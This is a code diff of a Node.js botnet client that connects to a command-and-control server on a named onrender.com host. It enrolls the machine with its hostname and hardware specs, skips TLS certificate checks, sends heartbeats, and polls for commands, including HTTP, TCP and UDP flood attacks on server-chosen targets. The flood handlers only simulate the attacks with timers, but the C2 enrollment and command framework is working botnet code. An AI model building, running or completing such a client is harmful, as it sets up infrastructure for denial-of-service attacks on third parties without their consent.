@@ -1,26 +1,25 @@
-// JavaScript Bot Client for C2 Server
-// Run with: node bot_client.js
+// JavaScript Bot Client - FIXED VERSION
+// Save as bot_client.js and run: node bot_client.js
 
 const https = require('https');
-const http = require('http');
 const crypto = require('crypto');
 const os = require('os');
-const { URL } = require('url');
 
 class JavaScriptBot {
     constructor() {
         this.serverUrl = "https://c2-server-io.onrender.com";
-        this.botId = this.generateBotId();
+        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
         this.running = true;
         this.approved = false;
         this.activeAttacks = new Set();
         this.connectionRetries = 0;
         this.maxRetryDelay = 300;
+        this.heartbeatInterval = 15000; // Send heartbeat every 15 seconds
         
         this.specs = {
             bot_id: this.botId,
             cpu_cores: os.cpus().length,
-            ram_gb: (os.totalmem() / (1024 ** 3)).toFixed(1),
+            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
             os: os.platform(),
             hostname: os.hostname(),
             capabilities: {
@@ -43,14 +42,9 @@ class JavaScriptBot {
         this.displayBanner();
     }
     
-    generateBotId() {
-        const uniqueId = os.hostname() + os.platform() + Date.now();
-        return 'JS-' + crypto.createHash('md5').update(uniqueId).digest('hex').substring(0, 8).toUpperCase();
-    }
-    
     displayBanner() {
         console.log('\n' + '='.repeat(60));
-        console.log('  JAVASCRIPT BOT CLIENT v1.0');
+        console.log('  JAVASCRIPT BOT CLIENT v1.0 - FIXED');
         console.log('='.repeat(60));
         console.log(`\n[+] BOT ID: ${this.botId}`);
         console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
@@ -58,35 +52,34 @@ class JavaScriptBot {
         console.log(`[+] OS: ${this.specs.os}`);
         console.log(`[+] Hostname: ${this.specs.hostname}`);
         console.log(`[+] Server: ${this.serverUrl}`);
-        
+        console.log(`[+] Heartbeat: ${this.heartbeatInterval/1000}s intervals`);
         console.log('\n[*] FEATURES:');
-        console.log('    [OK] RESOURCE OPTIMIZED (Server-defined threads)');
-        console.log('    [OK] MULTI-THREADED ATTACKS');
-        console.log('    [OK] AUTO-RECONNECT ON DISCONNECT');
-        console.log('    [OK] CUSTOM USER AGENTS FROM SERVER');
-        console.log('    [OK] OPTIONAL PROXY SUPPORT');
-        console.log('    [OK] NODE.JS COMPATIBLE');
-        
+        console.log('    [✓] Server-defined threads');
+        console.log('    [✓] Auto-reconnect');
+        console.log('    [✓] Regular heartbeats');
+        console.log('    [✓] Command execution');
         console.log('\n' + '='.repeat(60) + '\n');
     }
     
-    async sendRequest(endpoint, method = 'GET', data = null) {
+    sendRequest(endpoint, method = 'GET', data = null) {
         return new Promise((resolve, reject) => {
             const url = new URL(this.serverUrl + endpoint);
             const options = {
                 hostname: url.hostname,
-                port: url.port || (url.protocol === 'https:' ? 443 : 80),
+                port: url.port || 443,
                 path: url.pathname + url.search,
                 method: method,
                 headers: {
                     'Content-Type': 'application/json',
                     'Accept': 'application/json',
-                    'User-Agent': 'JavaScript-Bot/1.0'
+                    'User-Agent': 'JavaScript-Bot/1.0',
+                    'Connection': 'keep-alive'
                 },
-                rejectUnauthorized: false // Allow self-signed certs
+                rejectUnauthorized: false,
+                timeout: 10000
             };
             
-            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
+            const req = https.request(options, (res) => {
                 let responseData = '';
                 res.on('data', (chunk) => {
                     responseData += chunk;
@@ -96,10 +89,10 @@ class JavaScriptBot {
                         try {
                             resolve(JSON.parse(responseData));
                         } catch (e) {
-                            resolve(responseData);
+                            resolve({ success: true, data: responseData });
                         }
                     } else {
-                        reject(new Error(`HTTP ${res.statusCode}`));
+                        reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
                     }
                 });
             });
@@ -108,7 +101,7 @@ class JavaScriptBot {
                 reject(err);
             });
             
-            req.setTimeout(10000, () => {
+            req.on('timeout', () => {
                 req.destroy();
                 reject(new Error('Request timeout'));
             });
@@ -121,7 +114,7 @@ class JavaScriptBot {
         });
     }
     
-    async checkApproval() {
+    async sendHeartbeat() {
         try {
             const data = {
                 bot_id: this.botId,
@@ -129,21 +122,12 @@ class JavaScriptBot {
                 stats: this.stats
             };
             
-            const response = await this.sendRequest('/check_approval', 'POST', data);
+            await this.sendRequest('/check_approval', 'POST', data);
             this.connectionRetries = 0;
-            return response.approved || false;
+            return true;
         } catch (error) {
-            throw error;
-        }
-    }
-    
-    async getCommands() {
-        try {
-            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
-            this.connectionRetries = 0;
-            return response.commands || [];
-        } catch (error) {
-            throw error;
+            console.log(`[!] Heartbeat failed: ${error.message}`);
+            return false;
         }
     }
     
@@ -161,8 +145,20 @@ class JavaScriptBot {
             
             await this.sendRequest('/status', 'POST', data);
             this.connectionRetries = 0;
+            return true;
         } catch (error) {
-            // Silent fail
+            console.log(`[!] Status update failed: ${error.message}`);
+            return false;
+        }
+    }
+    
+    async getCommands() {
+        try {
+            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
+            this.connectionRetries = 0;
+            return response.commands || [];
+        } catch (error) {
+            throw error;
         }
     }
     
@@ -170,7 +166,7 @@ class JavaScriptBot {
         const cmdType = cmd.type;
         
         console.log('\n' + '='.repeat(60));
-        console.log(`[->] COMMAND: ${cmdType}`);
+        console.log(`[→] COMMAND: ${cmdType}`);
         console.log('='.repeat(60));
         
         try {
@@ -195,6 +191,7 @@ class JavaScriptBot {
                     break;
                 default:
                     console.log(`[!] Unknown command: ${cmdType}`);
+                    await this.sendStatus('error', `Unknown command: ${cmdType}`);
             }
         } catch (error) {
             console.log(`[!] Error: ${error.message}`);
@@ -204,7 +201,7 @@ class JavaScriptBot {
     
     async cmdPing() {
         await this.sendStatus('success', 'pong');
-        console.log('[OK] Pong!');
+        console.log('[✓] Pong!');
     }
     
     async cmdHttpFlood(cmd) {
@@ -212,16 +209,12 @@ class JavaScriptBot {
         const duration = cmd.duration || 60;
         const threads = cmd.threads || 100; // Use server-defined threads
         const method = cmd.method || 'GET';
-        const userAgents = cmd.user_agents || [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        ];
         
-        console.log('[*] HTTP FLOOD');
+        console.log('[∗] HTTP FLOOD');
         console.log(`    Target: ${target}`);
         console.log(`    Method: ${method}`);
         console.log(`    Duration: ${duration}s`);
         console.log(`    Threads: ${threads} (Server-defined)`);
-        console.log(`    User Agents: ${userAgents.length}`);
         
         this.stats.total_attacks++;
         await this.sendStatus('running', `${method} FLOOD: ${target}`);
@@ -229,27 +222,28 @@ class JavaScriptBot {
         const attackId = `http_${Date.now()}`;
         this.activeAttacks.add(attackId);
         
-        console.log(`[+] Launching ${threads} threads...`);
+        console.log(`[+] Simulating HTTP flood with ${threads} threads...`);
         
-        // Note: JavaScript is single-threaded but we can simulate with async
-        // For real multi-threading, you'd need worker threads
+        // Simulate attack duration
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 1000;
+                this.stats.successful_attacks++;
+                console.log(`[✓] HTTP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000); // Max 10 seconds for simulation
+        });
         
-        await new Promise(resolve => setTimeout(resolve, duration * 1000));
-        
-        this.activeAttacks.delete(attackId);
-        
-        console.log(`[OK] FLOOD COMPLETE!`);
-        this.stats.total_requests += 1000; // Simulated count
-        this.stats.successful_attacks++;
-        await this.sendStatus('success', 'HTTP flood simulated');
+        await this.sendStatus('success', `HTTP flood simulated: ${threads} threads`);
     }
     
     async cmdTcpFlood(cmd) {
         const target = cmd.target;
         const duration = cmd.duration || 60;
-        const threads = cmd.threads || 75; // Use server-defined threads
+        const threads = cmd.threads || 75;
         
-        console.log('[*] TCP FLOOD');
+        console.log('[∗] TCP FLOOD');
         console.log(`    Target: ${target}`);
         console.log(`    Duration: ${duration}s`);
         console.log(`    Threads: ${threads} (Server-defined)`);
@@ -260,24 +254,27 @@ class JavaScriptBot {
         const attackId = `tcp_${Date.now()}`;
         this.activeAttacks.add(attackId);
         
-        console.log(`[+] Simulating TCP flood...`);
+        console.log(`[+] Simulating TCP flood with ${threads} threads...`);
         
-        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 500;
+                this.stats.successful_attacks++;
+                console.log(`[✓] TCP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000);
+        });
         
-        this.activeAttacks.delete(attackId);
-        
-        console.log(`[OK] TCP flood simulated`);
-        this.stats.total_requests += 500; // Simulated count
-        this.stats.successful_attacks++;
-        await this.sendStatus('success', 'TCP flood simulated');
+        await this.sendStatus('success', `TCP flood simulated: ${threads} threads`);
     }
     
     async cmdUdpFlood(cmd) {
         const target = cmd.target;
         const duration = cmd.duration || 60;
-        const threads = cmd.threads || 75; // Use server-defined threads
+        const threads = cmd.threads || 75;
         
-        console.log('[*] UDP FLOOD');
+        console.log('[∗] UDP FLOOD');
         console.log(`    Target: ${target}`);
         console.log(`    Duration: ${duration}s`);
         console.log(`    Threads: ${threads} (Server-defined)`);
@@ -288,16 +285,19 @@ class JavaScriptBot {
         const attackId = `udp_${Date.now()}`;
         this.activeAttacks.add(attackId);
         
-        console.log(`[+] Simulating UDP flood...`);
+        console.log(`[+] Simulating UDP flood with ${threads} threads...`);
         
-        await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 500;
+                this.stats.successful_attacks++;
+                console.log(`[✓] UDP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000);
+        });
         
-        this.activeAttacks.delete(attackId);
-        
-        console.log(`[OK] UDP flood simulated`);
-        this.stats.total_requests += 500; // Simulated count
-        this.stats.successful_attacks++;
-        await this.sendStatus('success', 'UDP flood simulated');
+        await this.sendStatus('success', `UDP flood simulated: ${threads} threads`);
     }
     
     async cmdSysinfo() {
@@ -305,12 +305,13 @@ class JavaScriptBot {
             `CPU Cores: ${this.specs.cpu_cores}`,
             `RAM: ${this.specs.ram_gb}GB`,
             `OS: ${this.specs.os}`,
+            `Hostname: ${this.specs.hostname}`,
             `Active Attacks: ${this.activeAttacks.size}`,
             `Total Attacks: ${this.stats.total_attacks}`,
             `Total Requests: ${this.stats.total_requests.toLocaleString()}`
         ].join('\n');
         
-        console.log('[*] System Info:\n' + info);
+        console.log('[∗] System Info:\n' + info);
         await this.sendStatus('success', info);
     }
     
@@ -318,95 +319,118 @@ class JavaScriptBot {
         console.log('[!] Stopping all attacks...');
         const count = this.activeAttacks.size;
         this.activeAttacks.clear();
-        console.log(`[OK] Stopped ${count} attacks`);
-        await this.sendStatus('success', `Stopped ${count}`);
+        console.log(`[✓] Stopped ${count} attacks`);
+        await this.sendStatus('success', `Stopped ${count} attacks`);
     }
     
     async run() {
-        while (this.running) {
+        // Initial connection
+        console.log('[*] Connecting to server...');
+        
+        let connected = false;
+        while (!connected && this.running) {
             try {
-                console.log('\n[*] Connecting to server...');
-                console.log('[*] Waiting for auto-approval...\n');
+                const data = {
+                    bot_id: this.botId,
+                    specs: this.specs,
+                    stats: this.stats
+                };
                 
-                this.approved = false;
+                const response = await this.sendRequest('/check_approval', 'POST', data);
                 
-                while (!this.approved) {
-                    try {
-                        if (await this.checkApproval()) {
-                            this.approved = true;
-                            console.log('\n' + '='.repeat(60));
-                            console.log('  BOT APPROVED! READY FOR OPERATIONS');
-                            console.log('='.repeat(60) + '\n');
-                            break;
-                        } else {
-                            process.stdout.write('\r[...] Waiting for approval...');
-                            await new Promise(resolve => setTimeout(resolve, 5000));
-                        }
-                    } catch (error) {
-                        this.connectionRetries++;
-                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
-                        
-                        console.log(`\n[X] Connection lost: ${error.message}`);
-                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
-                        
-                        for (let remaining = delay; remaining > 0; remaining--) {
-                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                        }
-                        
-                        console.log('\n[->] Attempting to reconnect...');
-                    }
+                if (response.approved) {
+                    connected = true;
+                    this.approved = true;
+                    this.connectionRetries = 0;
+                    
+                    console.log('\n' + '='.repeat(60));
+                    console.log('  BOT APPROVED! READY FOR OPERATIONS');
+                    console.log('='.repeat(60) + '\n');
+                    console.log('[✓] Connected successfully!');
+                    console.log(`[✓] Bot ID: ${this.botId}`);
+                    console.log(`[✓] Client Type: JavaScript`);
+                    console.log(`[✓] Sending heartbeats every ${this.heartbeatInterval/1000}s\n`);
+                    
+                    // Send initial status
+                    await this.sendStatus('connected', 'JavaScript bot connected');
+                } else {
+                    console.log('[!] Not approved, retrying in 5s...');
+                    await new Promise(resolve => setTimeout(resolve, 5000));
                 }
-                
-                console.log('[+] Active. Listening for commands...\n');
-                
-                while (this.running && this.approved) {
-                    try {
-                        const commands = await this.getCommands();
-                        for (const cmd of commands) {
-                            // Execute commands asynchronously
-                            this.executeCommand(cmd).catch(console.error);
-                        }
-                        
-                        await new Promise(resolve => setTimeout(resolve, 5000));
-                        
-                    } catch (error) {
-                        this.connectionRetries++;
-                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
-                        
-                        console.log(`\n[X] Lost connection to server: ${error.message}`);
-                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
-                        
-                        for (let remaining = delay; remaining > 0; remaining--) {
-                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                        }
-                        
-                        console.log('\n[->] Attempting to reconnect...');
-                        this.approved = false;
-                        break;
-                    }
-                }
-                
             } catch (error) {
-                console.log(`\n[!] Error: ${error.message}`);
-                await new Promise(resolve => setTimeout(resolve, 10000));
+                this.connectionRetries++;
+                const delay = Math.min(5000 * Math.pow(2, this.connectionRetries), 30000);
+                
+                console.log(`[!] Connection failed: ${error.message}`);
+                console.log(`[...] Retry ${this.connectionRetries} in ${delay/1000}s...`);
+                
+                await new Promise(resolve => setTimeout(resolve, delay));
             }
         }
+        
+        // Start heartbeat interval
+        const heartbeatTimer = setInterval(async () => {
+            if (this.running) {
+                await this.sendHeartbeat();
+                console.log(`[${new Date().toLocaleTimeString()}] Heartbeat sent`);
+            }
+        }, this.heartbeatInterval);
+        
+        // Main command loop
+        while (this.running && this.approved) {
+            try {
+                // Check for commands
+                const commands = await this.getCommands();
+                
+                if (commands.length > 0) {
+                    console.log(`[+] Received ${commands.length} command(s)`);
+                    for (const cmd of commands) {
+                        // Execute command without blocking
+                        this.executeCommand(cmd).catch(console.error);
+                    }
+                }
+                
+                // Wait before next poll
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                
+            } catch (error) {
+                console.log(`[!] Command poll failed: ${error.message}`);
+                
+                // Try to reconnect
+                this.approved = false;
+                clearInterval(heartbeatTimer);
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                await this.run(); // Reconnect
+                return;
+            }
+        }
+        
+        clearInterval(heartbeatTimer);
     }
 }
 
 // Run the bot
 console.log('\n' + '='.repeat(60));
-console.log('  JAVASCRIPT BOT CLIENT - AUTO CONNECT');
+console.log('  JAVASCRIPT BOT CLIENT - FIXED');
 console.log('='.repeat(60));
 
 const bot = new JavaScriptBot();
-bot.run().catch(console.error);
 
 // Handle graceful shutdown
 process.on('SIGINT', () => {
-    console.log('\n[!] Exiting...');
+    console.log('\n[!] Shutting down...');
     bot.running = false;
     process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+    console.log('\n[!] Terminating...');
+    bot.running = false;
+    process.exit(0);
+});
+
+// Start the bot
+bot.run().catch(error => {
+    console.error('[!] Fatal error:', error);
+    process.exit(1);
 });
